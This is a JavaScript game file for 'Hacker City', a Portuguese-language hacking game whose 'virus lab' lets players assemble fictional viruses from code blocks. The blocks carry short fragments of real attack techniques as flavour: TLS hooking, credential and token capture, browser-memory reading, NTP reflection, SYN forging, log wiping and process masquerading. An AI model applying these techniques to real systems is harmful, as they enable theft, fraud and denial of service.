/**
 * ============================================================================
 * HACKER CITY — LABORATÓRIO DE VÍRUS (ENGENHARIA DE BLOCOS DE CÓDIGO)
 * ============================================================================
 * Mecânica oficial:
 * - Menu dedicado "Laboratório de Vírus" (em Meu Computador).
 * - 3 Rounds aleatórios por compilação (1 + 2 + 1 = 4 blocos de código):
 *     * Round 1: aparecem 3 opções aleatórias -> jogador escolhe APENAS 1.
 *     * Round 2: aparecem 3 novas opções aleatórias -> jogador escolhe EXATAMENTE 2.
 *     * Round 3: aparecem 3 novas opções aleatórias -> jogador escolhe APENAS 1.
 * - 60 blocos distintos de programação real (20 x C(24,2)=276 x 16 = 88.320 junções!)
 *   + leve explicação intuitiva em cada bloco e no combo parcial para dar noção antes de escolher.
 * - Tratamento inteligente quando gera o MESMO VÍRUS que o jogador já possui
 *   (preserva o mais forte, lapida +v0.1/+v0.2 até o teto e converte repetição em bônus de XP sem entupir o HD).
 * - Escala Regressiva Oficial baseada em v10.0 = 3.00x MÁXIMO (3.00x mineração BTC,
 *   3.00x dinheiro por Spam/Warez/Bank, 3.00x DDoS), regredindo proporcionalmente
 *   nas versões menores (v7.0=2.33x, v5.5=2.00x, v3.0=1.44x, v1.0=1.00x, v0.6=0.68x).
 * ============================================================================
 */
(function () {
  'use strict';

  const MAX_LAB_LEVEL = 10;
  const LAB_SESSION_FEE = 1000; // $ 1.000 cobrados por uso do Laboratório
  const LAB_COOLDOWN_MS = 24 * 60 * 60 * 1000; // 1 vez por Mês no jogo (= 1 Dia real / 24h)

  // Cálculo regressivo oficial (espelhado de SoftwareEngine.getVirusYieldMultiplier):
  // v10.0 = 3.00x MÁXIMO -> regredindo até v1.0 = 1.00x e v0.5 = 0.60x
  function calcVirusMultiplier(versionInt) {
    if (window.softwareEngine && typeof window.softwareEngine.getVirusYieldMultiplier === 'function') {
      return window.softwareEngine.getVirusYieldMultiplier(versionInt);
    }
    const v = Math.max(0.5, Math.min(10.0, Number(versionInt || 10) / 10));
    if (v >= 1.0) {
      return +(1.0 + ((v - 1.0) / 9.0) * 2.0).toFixed(2);
    }
    return +(0.60 + (v - 0.5) * 0.80).toFixed(2);
  }

  // Tabela de progressão Nível 1 -> Nível 10 (Nível Máximo)
  const LAB_LEVEL_TABLE = [
    { level: 1,  xpReq: 0,    maxTier: 1, maxVerInt: 18,  title: 'Bancada Improvisada',       unlockNote: 'Camada I liberada (teto v1.8 · 1.18x)' },
    { level: 2,  xpReq: 90,   maxTier: 1, maxVerInt: 26,  title: 'Montador de Scripts',       unlockNote: 'Otimizador Nv.2 (teto v2.6 · 1.36x)' },
    { level: 3,  xpReq: 220,  maxTier: 2, maxVerInt: 35,  title: 'Escovador de Sockets',      unlockNote: 'Camada II liberada (teto v3.5 · 1.56x)' },
    { level: 4,  xpReq: 400,  maxTier: 2, maxVerInt: 45,  title: 'Engenheiro de Payloads',    unlockNote: 'Linker Assíncrono (teto v4.5 · 1.78x)' },
    { level: 5,  xpReq: 640,  maxTier: 3, maxVerInt: 55,  title: 'Arquiteto Polimórfico',     unlockNote: 'Camada III liberada (teto v5.5 · 2.00x)' },
    { level: 6,  xpReq: 950,  maxTier: 3, maxVerInt: 67,  title: 'Especialista em Ring-3',    unlockNote: 'Ofuscador Nativo (teto v6.7 · 2.27x)' },
    { level: 7,  xpReq: 1340, maxTier: 4, maxVerInt: 78,  title: 'Mestre de Exploração',      unlockNote: 'Camada IV liberada (teto v7.8 · 2.51x)' },
    { level: 8,  xpReq: 1820, maxTier: 4, maxVerInt: 88,  title: 'Forjador de Rootkits',      unlockNote: 'Injeção Vetorial (teto v8.8 · 2.73x)' },
    { level: 9,  xpReq: 2400, maxTier: 5, maxVerInt: 95,  title: 'Autor de Zero-Days',        unlockNote: 'Camada V liberada (teto v9.5 · 2.89x)' },
    { level: 10, xpReq: 3100, maxTier: 5, maxVerInt: 100, title: 'Nível Máximo · Arquiteto Zero-Day', unlockNote: 'Teto Absoluto Liberado (v10.0 · 3.00x MÁX)' }
  ];

  const VIRUS_FAMILY_META = {
    vspam:  { key: 'vspam',  filename: 'Spam.vspam',       label: 'Spam Mailer (.vspam)',       unitLabel: 'de dinheiro por Spam',       yieldDesc: 'Gera $ HC passivo disparando lotes de mensagens' },
    vwarez: { key: 'vwarez', filename: 'Warez.vwarez',     label: 'Seeder Pirata (.vwarez)',    unitLabel: 'de dinheiro em rede P2P',    yieldDesc: 'Monetiza banda de compartilhamento P2P em $ HC' },
    vminer: { key: 'vminer', filename: 'Miner.vminer',     label: 'Minerador Cripto (.vminer)', unitLabel: 'de mineração de Bitcoin',    yieldDesc: 'Minera satoshis reais de Bitcoin na CPU alvo' },
    vbank:  { key: 'vbank',  filename: 'BankTrojan.vbank', label: 'Trojan Bancário (.vbank)',   unitLabel: 'de desvio financeiro',       yieldDesc: 'Intercepta sessões web e desvia % bancária em $ HC' },
    vddos:  { key: 'vddos',  filename: 'DDoS_Node.vddos',  label: 'Escravo DDoS (.vddos)',      unitLabel: 'de potência Gbps em DDoS',   yieldDesc: 'Amplifica força em Gbps nos ataques de sobrecarga' }
  };

  // =========================================================================
  // ROUND 1 — 20 BLOCOS DE ENTRADA / ABERTURA (Escolher 1 de 3)
  // Cada bloco traz uma leve explicação humana ("hint") do que aquela parte faz!
  // =========================================================================
  const ROUND_1_BLOCKS = [
    // Canal: mail_pipe (afinidade natural com Spam)
    {
      id: 'R1_01', round: 1, tier: 1, lang: 'POSIX C', channel: 'mail_pipe', family: 'vspam',
      fn: 'int open_mx_relay(const char *host)',
      abi: 'ABI: fd_smtp -> text_pipe[512]',
      hint: 'Abre um canal simples de texto conectado a servidores de envio de mensagens.',
      code: `int fd = socket(AF_INET, SOCK_STREAM, 0);\nconnect(fd, (struct sockaddr*)&mx25, sizeof(mx25));\nsend(fd, "EHLO relay.local\\r\\n", 18, 0);\nreturn fd;`
    },
    {
      id: 'R1_02', round: 1, tier: 2, lang: 'Python 3', channel: 'mail_pipe', family: 'vspam',
      fn: 'async def bind_dkim_spool(loop)',
      abi: 'ABI: coro_pipe -> mime_queue',
      hint: 'Inicia fila assíncrona autenticada para despachar várias mensagens seguidas.',
      code: `rd, wr = await asyncio.open_connection(mx_ip, 587)\nwr.write(b"STARTTLS\\r\\n")\nawait wr.drain()\nreturn (rd, wr)`
    },
    {
      id: 'R1_03', round: 1, tier: 3, lang: 'Rust', channel: 'mail_pipe', family: 'vspam',
      fn: 'fn hijack_MTA_unix_sock() -> RawFd',
      abi: 'ABI: unix_fd -> batch_envelope',
      hint: 'Conecta direto no serviço interno de correio da máquina sem passar pela porta externa.',
      code: `let s = UnixStream::connect("/var/spool/postfix/public/pickup")?;\ns.set_nonblocking(true)?;\nOk(s.into_raw_fd())`
    },
    {
      id: 'R1_04', round: 1, tier: 4, lang: 'C99', channel: 'mail_pipe', family: 'vspam',
      fn: 'void* mmap_mx_ring_tx(size_t slots)',
      abi: 'ABI: shm_mail -> zero_alloc_q',
      hint: 'Mapeia memória compartilhada de alta velocidade para enfileirar envios em massa.',
      code: `void *ring = mmap(0, slots * 4096, PROT_READ|PROT_WRITE,\n                  MAP_SHARED|MAP_ANONYMOUS, -1, 0);\n*(uint32_t*)ring = 0x534D5450; /* SMTP */\nreturn ring;`
    },

    // Canal: p2p_chunk (afinidade natural com Warez)
    {
      id: 'R1_05', round: 1, tier: 1, lang: 'C99', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'int dht_bootstrap_udp(uint16_t port)',
      abi: 'ABI: sock_dht -> piece_map[64]',
      hint: 'Localiza pares na rede ponto-a-ponto para começar a trocar partes de arquivos.',
      code: `int u = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\nbind(u, (struct sockaddr*)&dht_addr, sizeof(dht_addr));\nsendto(u, "d1:q9:find_nodee", 16, 0, &boot, 16);\nreturn u;`
    },
    {
      id: 'R1_06', round: 1, tier: 2, lang: 'Rust', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'fn peer_wire_handshake(ih: &[u8; 20])',
      abi: 'ABI: tcp_swarm -> bitfield_io',
      hint: 'Negocia protocolo de compartilhamento para distribuir blocos de mídia em enxame.',
      code: `let mut buf = [0u8; 68];\nbuf[0] = 19;\nbuf[1..20].copy_from_slice(b"BitTorrent protocol");\nbuf[28..48].copy_from_slice(ih);`
    },
    {
      id: 'R1_07', round: 1, tier: 3, lang: 'POSIX C', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'int splice_iso_storage(int disk_fd)',
      abi: 'ABI: fd_blk -> pipe_splice_64k',
      hint: 'Liga a leitura de arquivos grandes do disco direto num duto rápido de upload.',
      code: `int pfd[2];\npipe(pfd);\nfcntl(pfd[1], F_SETPIPE_SZ, 1048576);\nsplice(disk_fd, NULL, pfd[1], NULL, 65536, SPLICE_F_MOVE);`
    },
    {
      id: 'R1_08', round: 1, tier: 4, lang: 'C++20', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'utp_mux* init_utp_ledbat_bus()',
      abi: 'ABI: utp_ring -> swarm_slices',
      hint: 'Abre malha P2P inteligente que ocupa toda a banda livre sem derrubar a conexão.',
      code: `auto *mux = new utp_mux{ .wnd_kb = 8192, .delay_us = 900 };\nmux->open_trackerless_mesh(0x1AE3);\nreturn mux;`
    },

    // Canal: simd_alu (afinidade natural com Miner)
    {
      id: 'R1_09', round: 1, tier: 1, lang: 'C99', channel: 'simd_alu', family: 'vminer',
      fn: 'void bind_worker_affinity(int core_id)',
      abi: 'ABI: cpu_pin -> alu_lane64',
      hint: 'Reserva um núcleo do processador exclusivamente para cálculos matemáticos repetitivos.',
      code: `cpu_set_t mask;\nCPU_ZERO(&mask);\nCPU_SET(core_id, &mask);\nsched_setaffinity(0, sizeof(mask), &mask);`
    },
    {
      id: 'R1_10', round: 1, tier: 2, lang: 'x86_64 ASM', channel: 'simd_alu', family: 'vminer',
      fn: 'align_ymm_scratchpad_256:',
      abi: 'ABI: ymm0..ymm7 -> hash_state',
      hint: 'Alinha registradores vetoriais de 256 bits na CPU para processar hashes mais rápido.',
      code: `mov rax, rsp\nand rsp, -32\nvpxor ymm0, ymm0, ymm0\nvmovdqa [rsp], ymm0`
    },
    {
      id: 'R1_11', round: 1, tier: 3, lang: 'POSIX C', channel: 'simd_alu', family: 'vminer',
      fn: 'void* alloc_2mb_hugepages(size_t n)',
      abi: 'ABI: huge_dag -> l3_cache_line',
      hint: 'Aloca blocos gigantes no cache do processador para acelerar força bruta criptográfica.',
      code: `void *dag = mmap(NULL, n * 2097152UL, PROT_READ|PROT_WRITE,\n                 MAP_PRIVATE|MAP_ANONYMOUS|MAP_HUGETLB, -1, 0);\nmadvise(dag, n * 2097152UL, MADV_WILLNEED);\nreturn dag;`
    },
    {
      id: 'R1_12', round: 1, tier: 5, lang: 'x86_64 ASM', channel: 'simd_alu', family: 'vminer',
      fn: 'init_avx512_sha_ni_lanes:',
      abi: 'ABI: zmm0..zmm15 -> sha_ni_pipe',
      hint: 'Destrava instruções nativas SHA-NI de silício para triturar hashes em paralelo máximo.',
      code: `vpternlogd zmm1, zmm2, zmm3, 0x96\nsha256rnds2 xmm0, xmm1\nprefetcht0 [rdi + 128]\nret`
    },

    // Canal: tls_mem (afinidade natural com BankTrojan)
    {
      id: 'R1_13', round: 1, tier: 1, lang: 'POSIX C', channel: 'tls_mem', family: 'vbank',
      fn: 'void* hook_got_ssl_write(void *sym)',
      abi: 'ABI: plt_got -> tls_plain_buf',
      hint: 'Coloca um grampo na biblioteca de segurança para ler dados antes da criptografia.',
      code: `void *h = dlopen("libssl.so.3", RTLD_LAZY);\norig_ssl_write = dlsym(h, "SSL_write");\nmprotect(got_page, 4096, PROT_READ|PROT_WRITE);\n*got_slot = sym;`
    },
    {
      id: 'R1_14', round: 1, tier: 2, lang: 'JavaScript', channel: 'tls_mem', family: 'vbank',
      fn: 'function wrapFetchCredentials(win)',
      abi: 'ABI: dom_hook -> json_payload',
      hint: 'Intercepta formulários e envios web do navegador para vigiar transações online.',
      code: `const _f = win.fetch;\nwin.fetch = async (u, opt = {}) => {\n  if (opt.body) tapChannel.push([u, opt.body]);\n  return _f.call(win, u, opt);\n};`
    },
    {
      id: 'R1_15', round: 1, tier: 4, lang: 'C99', channel: 'tls_mem', family: 'vbank',
      fn: 'long ptrace_attach_browser_heap(pid_t p)',
      abi: 'ABI: vm_readv -> session_key_ptr',
      hint: 'Inspeciona diretamente a memória RAM de aplicativos financeiros abertos.',
      code: `struct iovec loc = { buf, 4096 }, rem = { heap_va, 4096 };\nreturn process_vm_readv(p, &loc, 1, &rem, 1, 0);`
    },
    {
      id: 'R1_16', round: 1, tier: 5, lang: 'Rust', channel: 'tls_mem', family: 'vbank',
      fn: 'unsafe fn uprobe_nss_pr_write(ctx: *mut PtRegs)',
      abi: 'ABI: uprobe_tls -> clear_iban_frame',
      hint: 'Instala sonda invisível nos registradores para capturar pacotes autenticados em texto limpo.',
      code: `let buf_ptr = (*ctx).rsi as *const u8;\nlet len = ((*ctx).rdx as usize).min(2048);\nslice::from_raw_parts(buf_ptr, len)`
    },

    // Canal: raw_pkt (afinidade natural com DDoS)
    {
      id: 'R1_17', round: 1, tier: 1, lang: 'POSIX C', channel: 'raw_pkt', family: 'vddos',
      fn: 'int open_raw_ip_hdrincl(void)',
      abi: 'ABI: sock_raw -> ipv4_frame',
      hint: 'Abre soquete bruto de rede permitindo fabricar pacotes IP customizados manualmente.',
      code: `int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);\nint one = 1;\nsetsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));\nreturn s;`
    },
    {
      id: 'R1_18', round: 1, tier: 2, lang: 'C99', channel: 'raw_pkt', family: 'vddos',
      fn: 'int bind_packet_tx_ring(int ifindex)',
      abi: 'ABI: tpacket_v3 -> nic_tx_queue',
      hint: 'Cria um anel de transmissão colado na placa de rede para disparar rajadas contínuas.',
      code: `struct tpacket_req3 req = { .tp_block_size = 65536, .tp_block_nr = 32 };\nint fd = socket(AF_PACKET, SOCK_RAW, 0);\nsetsockopt(fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));\nreturn fd;`
    },
    {
      id: 'R1_19', round: 1, tier: 4, lang: 'C99', channel: 'raw_pkt', family: 'vddos',
      fn: 'int xsk_umem_zero_copy(void *umem)',
      abi: 'ABI: af_xdp -> umem_desc_ring',
      hint: 'Pula o sistema operacional para despejar tráfego pesado direto no cabo de rede.',
      code: `struct xdp_umem_reg mr = { .addr = (uint64_t)umem, .len = 1<<22,\n                           .chunk_size = 2048 };\nsetsockopt(xsk_fd, SOL_XDP, XDP_UMEM_REG, &mr, sizeof(mr));`
    },
    {
      id: 'R1_20', round: 1, tier: 5, lang: 'Rust', channel: 'raw_pkt', family: 'vddos',
      fn: 'fn map_pci_ixgbe_tx_doorbell(bar0: *mut u32)',
      abi: 'ABI: mmio_tx -> line_rate_burst',
      hint: 'Assume controle físico do barramento PCIe da placa de rede para vazão máxima.',
      code: `unsafe {\n  core::ptr::write_volatile(bar0.add(0x6018 / 4), tail_idx);\n  core::arch::x86_64::_mm_sfence();\n}`
    }
  ];

  // =========================================================================
  // ROUND 2 — 24 BLOCOS DE NÚCLEO / PAYLOAD (Escolher EXATAMENTE 2 de 3)
  // =========================================================================
  const ROUND_2_BLOCKS = [
    // 4 blocos mail_pipe (Spam)
    {
      id: 'R2_01', round: 2, tier: 1, lang: 'C99', channel: 'mail_pipe', family: 'vspam', subRole: 'generator',
      fn: 'size_t build_mime_multipart(char *out, int id)',
      abi: 'ABI: text_pipe -> mime_body',
      hint: 'Monta automaticamente o corpo e o cabeçalho de centenas de e-mails promocionais.',
      code: `return snprintf(out, 512, "From: noreply@node%d\\r\\n"\n  "Content-Type: multipart/alternative\\r\\n\\r\\n%s", id, body);`
    },
    {
      id: 'R2_02', round: 2, tier: 2, lang: 'Python 3', channel: 'mail_pipe', family: 'vspam', subRole: 'dispatcher',
      fn: 'def spray_rcpt_batch(wr, rcpt_list):',
      abi: 'ABI: mime_queue -> pipelined_rcpt',
      hint: 'Empilha dezenas de destinatários de uma só vez no mesmo túnel de mensagem.',
      code: `blob = "".join(f"RCPT TO:<{a}>\\r\\n" for a in rcpt_list[:64])\nwr.write(blob.encode("ascii") + b"DATA\\r\\n")`
    },
    {
      id: 'R2_03', round: 2, tier: 3, lang: 'Rust', channel: 'mail_pipe', family: 'vspam', subRole: 'mutator',
      fn: 'fn mutate_helo_spf_tokens(seed: u64) -> String',
      abi: 'ABI: batch_envelope -> polymorphic_hdr',
      hint: 'Alterna identificadores a cada remessa para contornar filtros antispam.',
      code: `let tok = seed.wrapping_mul(0x9E3779B97F4A7C15);\nformat!("Message-ID: <{:016x}@mx-edge.net>\\r\\n", tok)`
    },
    {
      id: 'R2_04', round: 2, tier: 5, lang: 'C99', channel: 'mail_pipe', family: 'vspam', subRole: 'dispatcher',
      fn: 'int sendmmsg_smtp_pipeline(int fd, struct mmsghdr *v)',
      abi: 'ABI: zero_alloc_q -> kernel_smtp_burst',
      hint: 'Dispara 128 envelopes de correio numa única chamada direta ao kernel.',
      code: `for (int i = 0; i < 128; i++) v[i].msg_hdr.msg_Flags = MSG_MORE;\nreturn sendmmsg(fd, v, 128, MSG_DONTWAIT);`
    },

    // 4 blocos p2p_chunk (Warez)
    {
      id: 'R2_05', round: 2, tier: 1, lang: 'C99', channel: 'p2p_chunk', family: 'vwarez', subRole: 'dispatcher',
      fn: 'ssize_t seed_piece_16k(int peer_fd, int idx)',
      abi: 'ABI: piece_map -> swarm_upload',
      hint: 'Envia fatias de 16 KB de arquivos compartilhados para compradores na rede P2P.',
      code: `uint32_t hdr[3] = { htonl(16393), htonl(7), htonl(idx) };\nsend(peer_fd, hdr, 12, MSG_MORE);\nreturn sendfile(peer_fd, iso_fd, &off, 16384);`
    },
    {
      id: 'R2_06', round: 2, tier: 2, lang: 'Rust', channel: 'p2p_chunk', family: 'vwarez', subRole: 'mutator',
      fn: 'fn rarest_first_bitfield_xor(bf: &mut [u8])',
      abi: 'ABI: bitfield_io -> super_seed_mask',
      hint: 'Prioriza e embaralha as partes mais raras do catálogo para manter upload sempre cheio.',
      code: `for byte in bf.iter_mut() {\n  *byte = byte.rotate_left(3) ^ 0xA5;\n}`
    },
    {
      id: 'R2_07', round: 2, tier: 3, lang: 'C++20', channel: 'p2p_chunk', family: 'vwarez', subRole: 'generator',
      fn: 'void reed_solomon_parity_shard(uint8_t *blk)',
      abi: 'ABI: pipe_splice_64k -> fec_shards',
      hint: 'Gera blocos extras de recuperação para acelerar entregas grandes em enxames P2P.',
      code: `for (size_t i = 0; i < 65536; i += 64)\n  gf256_mul_acc(&parity[i], &blk[i], 0x1D);`
    },
    {
      id: 'R2_08', round: 2, tier: 5, lang: 'POSIX C', channel: 'p2p_chunk', family: 'vwarez', subRole: 'dispatcher',
      fn: 'int io_uring_prep_send_zc_swarm(struct io_uring *r)',
      abi: 'ABI: swarm_slices -> zero_copy_seed',
      hint: 'Transmite arquivos piratas sem cópia na RAM usando fila assíncrona de última geração.',
      code: `struct io_uring_sqe *sqe = io_uring_get_sqe(r);\nio_uring_prep_send_zc(sqe, peer_fd, chunk_ptr, 65536, 0, 0);\nreturn io_uring_submit(r);`
    },

    // 4 blocos simd_alu (Miner)
    {
      id: 'R2_09', round: 2, tier: 1, lang: 'C99', channel: 'simd_alu', family: 'vminer', subRole: 'generator',
      fn: 'uint32_t grind_sha256d_nonce(uint32_t *hdr)',
      abi: 'ABI: alu_lane64 -> digest_u256',
      hint: 'Testa milhares de combinações numéricas SHA-256 em busca de blocos válidos.',
      code: `for (uint32_t n = 0; n < 0xFFFF; n++) {\n  hdr[19] = n;\n  if (sha256d_lead_zeros(hdr) >= 22) return n;\n}\nreturn 0;`
    },
    {
      id: 'R2_10', round: 2, tier: 2, lang: 'C99', channel: 'simd_alu', family: 'vminer', subRole: 'dispatcher',
      fn: 'int stratum_submit_share(int sfd, uint32_t nonce)',
      abi: 'ABI: hash_state -> json_rpc_share',
      hint: 'Envia imediatamente os cálculos resolvidos na CPU para validar recompensas em cripto.',
      code: `char req[192];\nint n = snprintf(req, 192, "{\\"method\\":\\"mining.submit\\",\\"nonce\\":\\"%08x\\"}\\n", nonce);\nreturn send(sfd, req, n, MSG_NOSIGNAL);`
    },
    {
      id: 'R2_11', round: 2, tier: 4, lang: 'x86_64 ASM', channel: 'simd_alu', family: 'vminer', subRole: 'mutator',
      fn: 'aesni_scratchpad_mix_4way:',
      abi: 'ABI: l3_cache_line -> randomx_mix',
      hint: 'Usa o acelerador de criptografia do próprio chip para multiplicar cálculos por segundo.',
      code: `movdqa xmm2, [rdi]\naesenc xmm2, xmm3\naesenc xmm2, [rsi + rax*8]\nmovdqa [rdi], xmm2`
    },
    {
      id: 'R2_12', round: 2, tier: 5, lang: 'x86_64 ASM', channel: 'simd_alu', family: 'vminer', subRole: 'generator',
      fn: 'avx512_8way_midstate_unroll:',
      abi: 'ABI: sha_ni_pipe -> 8x_nonce_hit',
      hint: 'Roda 8 linhas simultâneas de hash no mesmo ciclo do processador.',
      code: `vpaddd zmm4, zmm0, [rip + k256_vec]\nvprord zmm5, zmm4, 7\nvpxord zmm6, zmm5, zmm1`
    },

    // 4 blocos tls_mem (BankTrojan)
    {
      id: 'R2_13', round: 2, tier: 1, lang: 'C99', channel: 'tls_mem', family: 'vbank', subRole: 'generator',
      fn: 'int scan_iban_swift_frame(const char *buf, size_t n)',
      abi: 'ABI: tls_plain_buf -> acct_match',
      hint: 'Procura números de contas e transferências passando pela memória decifrada.',
      code: `const char *p = memmem(buf, n, "transfer_to=", 12);\nif (!p) return 0;\nmemcpy(captured_acct, p + 12, 16);\nreturn 1;`
    },
    {
      id: 'R2_14', round: 2, tier: 2, lang: 'JavaScript', channel: 'tls_mem', family: 'vbank', subRole: 'mutator',
      fn: 'function rewriteWirePayload(jsonBody, shadowAcc)',
      abi: 'ABI: json_payload -> shadow_split',
      hint: 'Injeta discretamente uma comissão espelho dentro de pagamentos em andamento.',
      code: `const tx = JSON.parse(jsonBody);\ntx.mirrorFee = +(tx.amount * 0.15).toFixed(2);\ntx.routeMirror = shadowAcc;\nreturn JSON.stringify(tx);`
    },
    {
      id: 'R2_15', round: 2, tier: 4, lang: 'Rust', channel: 'tls_mem', family: 'vbank', subRole: 'dispatcher',
      fn: 'fn splice_jwt_bearer_cookie(hdrs: &mut Vec<u8>)',
      abi: 'ABI: session_key_ptr -> auth_token_clone',
      hint: 'Clona chaves temporárias de sessão autenticada sem derrubar o login da vítima.',
      code: `if let Some(pos) = twoway::find_bytes(hdrs, b"Authorization: Bearer ") {\n  exfil_ring_push(&hdrs[pos + 22 .. pos + 86]);\n}`
    },
    {
      id: 'R2_16', round: 2, tier: 5, lang: 'C99', channel: 'tls_mem', family: 'vbank', subRole: 'mutator',
      fn: 'void hotpatch_hmac_tag_in_ram(uint8_t *frame)',
      abi: 'ABI: clear_iban_frame -> valid_mac_forge',
      hint: 'Recalcula na hora o selo de verificação do pacote financeiro alterado na RAM.',
      code: `recompute_sha256_hmac(session_secret, frame, 128, frame + 128);\n__builtin___clear_cache((char*)frame, (char*)frame + 160);`
    },

    // 4 blocos raw_pkt (DDoS)
    {
      id: 'R2_17', round: 2, tier: 1, lang: 'C99', channel: 'raw_pkt', family: 'vddos', subRole: 'generator',
      fn: 'void forge_tcp_syn_hdr(struct tcphdr *th, uint16_t dp)',
      abi: 'ABI: ipv4_frame -> syn_burst_hdr',
      hint: 'Fabrica cabeçalhos falsos de abertura TCP para saturar portas de servidores alvo.',
      code: `th->source = htons(rand16());\nth->dest = htons(dp);\nth->syn = 1;\nth->window = htons(64240);`
    },
    {
      id: 'R2_18', round: 2, tier: 2, lang: 'C99', channel: 'raw_pkt', family: 'vddos', subRole: 'mutator',
      fn: 'uint16_t csum_ipv4_fold_fast(const uint16_t *p)',
      abi: 'ABI: nic_tx_queue -> hw_csum_ready',
      hint: 'Calcula somas de verificação IPv4 ultrarrápidas para liberar rajadas de pacotes.',
      code: `uint32_t sum = p[0] + p[1] + p[2] + p[3] + p[4];\nsum = (sum >> 16) + (sum & 0xFFFF);\nreturn (uint16_t)~(sum + (sum >> 16));`
    },
    {
      id: 'R2_19', round: 2, tier: 3, lang: 'C99', channel: 'raw_pkt', family: 'vddos', subRole: 'dispatcher',
      fn: 'int udp_ntp_monlist_reflect(int s, struct sockaddr *v)',
      abi: 'ABI: umem_desc_ring -> amp_pulse',
      hint: 'Reflete pulsos UDP amplificados multiplicando o volume de tráfego contra o alvo.',
      code: `static const uint8_t ntp_mon[8] = { 0x17, 0x00, 0x03, 0x2a, 0, 0, 0, 0 };\nreturn sendto(s, ntp_mon, 8, MSG_DONTWAIT, v, 16);`
    },
    {
      id: 'R2_20', round: 2, tier: 5, lang: 'x86_64 ASM', channel: 'raw_pkt', family: 'vddos', subRole: 'dispatcher',
      fn: 'tx_ring_burst_64_descriptors:',
      abi: 'ABI: line_rate_burst -> 64x_wire_pkt',
      hint: 'Despeja 64 pacotes brutos por ciclo direto nos descritores da placa de rede.',
      code: `mov ecx, 64\n.loop_pkt:\nvmovdqa [rdi + rcx*32], ymm7\nloop .loop_pkt`
    },

    // 4 blocos transversais (2 Otimizadores Universais + 1 Armadilha de Bloqueio + 1 Amplificador Tier-5)
    {
      id: 'R2_21', round: 2, tier: 2, lang: 'POSIX C', channel: 'universal_boost', family: 'any', subRole: 'booster',
      fn: 'int epoll_edge_multiplex(int epfd, int fd)',
      abi: 'ABI: any_fd -> async_nonblock_mux',
      hint: 'Gerencia múltiplas conexões e tarefas ao mesmo tempo sem deixar o código travar.',
      code: `struct epoll_event ev = { .events = EPOLLOUT | EPOLLET, .data.fd = fd };\nfcntl(fd, F_SETFL, O_NONBLOCK);\nreturn epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);`
    },
    {
      id: 'R2_22', round: 2, tier: 3, lang: 'C99', channel: 'universal_boost', family: 'any', subRole: 'booster',
      fn: 'void lockfree_spsc_push(ring_t *q, void *item)',
      abi: 'ABI: any_bus -> lockfree_l1_ring',
      hint: 'Passa dados entre etapas em fila livre de travas, acelerando qualquer núcleo.',
      code: `size_t w = atomic_load_explicit(&q->head, memory_order_relaxed);\nq->slots[w & q->mask] = item;\natomic_store_explicit(&q->head, w + 1, memory_order_release);`
    },
    {
      id: 'R2_23', round: 2, tier: 1, lang: 'POSIX C', channel: 'sync_stall', family: 'trap', subRole: 'stall_trap',
      fn: 'void serialized_debug_barrier(pthread_mutex_t *m)',
      abi: 'ABI: global_lock -> sleep_sync_2s',
      hint: 'Trava a fila inteira e pausa por 2 segundos esperando gravação lenta de depuração.',
      code: `pthread_mutex_lock(m);\nfsync(STDERR_FILENO);\nsleep(2); /* aguarda flush síncrono */\npthread_mutex_unlock(m);`
    },
    {
      id: 'R2_24', round: 2, tier: 5, lang: 'Rust', channel: 'universal_boost', family: 'any', subRole: 'hyper_jit',
      fn: 'unsafe fn jit_emit_native_trampoline(code: &[u8])',
      abi: 'ABI: any_lane -> rwx_jit_turbo',
      hint: 'Compila instruções nativas direto na memória RAM para turbinar o núcleo principal.',
      code: `let mem = mmap(ptr::null_mut(), 4096, PROT_READ|PROT_WRITE|PROT_EXEC,\n               MAP_PRIVATE|MAP_ANON, -1, 0);\nptr::copy_nonoverlapping(code.as_ptr(), mem as *mut u8, code.len());`
    }
  ];

  // =========================================================================
  // ROUND 3 — 16 BLOCOS DE FECHAMENTO / PERSISTÊNCIA & EVASÃO (Escolher 1 de 3)
  // =========================================================================
  const ROUND_3_BLOCKS = [
    // mail_pipe (Spam)
    {
      id: 'R3_01', round: 3, tier: 1, lang: 'Bash/Sys', channel: 'mail_pipe', family: 'vspam',
      fn: 'cleanup_mailq_footprints()',
      abi: 'ABI: mime_body -> clean_quit_221',
      hint: 'Fecha a sessão de envio de mensagens e apaga linhas básicas do registro de correio.',
      code: `printf "QUIT\\r\\n" >&3\nsed -i '/relay\\.local/d' /var/log/mail.log 2>/dev/null\nexec 3>&-`
    },
    {
      id: 'R3_02', round: 3, tier: 3, lang: 'C99', channel: 'mail_pipe', family: 'vspam',
      fn: 'void rotate_ptr_ehlo_daemon(void)',
      abi: 'ABI: polymorphic_hdr -> cron_respawn',
      hint: 'Disfarça o disparador de mensagens como tarefa comum do sistema em segundo plano.',
      code: `prctl(PR_SET_NAME, "[kworker/u4:1]", 0, 0, 0);\nclose(STDIN_FILENO);\ndaemon(1, 0);`
    },
    {
      id: 'R3_03', round: 3, tier: 5, lang: 'Rust', channel: 'mail_pipe', family: 'vspam',
      fn: 'fn seal_dkim_ghost_queue(fd: RawFd)',
      abi: 'ABI: kernel_smtp_burst -> stealth_mta_hook',
      hint: 'Sela a fila de correio em modo fantasma sem deixar arquivos temporários em disco.',
      code: `unsafe { libc::setsockopt(fd, libc::SOL_SOCKET, libc::SO_LINGER, &linger, 8); }\nstd::fs::remove_file("/tmp/.mta_spool.lock").ok();`
    },

    // p2p_chunk (Warez)
    {
      id: 'R3_04', round: 3, tier: 1, lang: 'C99', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'void mask_upnp_port_lease(uint16_t port)',
      abi: 'ABI: swarm_upload -> stealth_dht_close',
      hint: 'Mascaramento simples da porta P2P para manter o compartilhamento ativo sem alerta.',
      code: `shutdown(dht_sock, SHUT_RD);\nmemset(peer_id_buf, 0, 20);\nmemcpy(peer_id_buf, "-TR3000-", 8);`
    },
    {
      id: 'R3_05', round: 3, tier: 3, lang: 'Rust', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'fn encrypt_mse_rc4_stream(s: &mut [u8])',
      abi: 'ABI: fec_shards -> obfuscated_torrent',
